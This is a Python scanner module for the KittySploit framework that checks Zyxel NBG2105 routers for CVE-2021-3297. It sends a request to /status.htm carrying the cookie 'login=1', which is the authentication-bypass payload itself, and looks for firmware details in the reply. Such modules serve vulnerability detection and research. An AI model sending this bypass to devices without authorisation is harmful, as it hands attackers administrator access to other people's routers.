#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zyxel NBG2105 V1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zyxel NBG2105 V1.00(AAGU.2)C0 - Authentication Bypass Detection',
        'description': 'Zyxel NBG2105 V1.00(AAGU.2)C0 devices are susceptible to authentication bypass vulnerabilities because setting the login cookie to 1 provides administrator access.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'zyxel', 'auth-bypass', 'router', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass',
            'https://www.zyxel.com/us/en/support/security_advisories.shtml',
            'https://www.zyxel.com/support/SupportLandingSR.shtml?c=gb&l=en&kbid=M-01490&md=NBG2105',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-3297',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-3297',
    }

    def run(self):
        path = '/status.htm'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'language=en; login=1'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Running Time', 'Firmware Version', 'Firmware Build Time',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Zyxel NBG2105 V1.00(AAGU.2)C0 - Authentication Bypass detected', path=path)
            return True
        return False

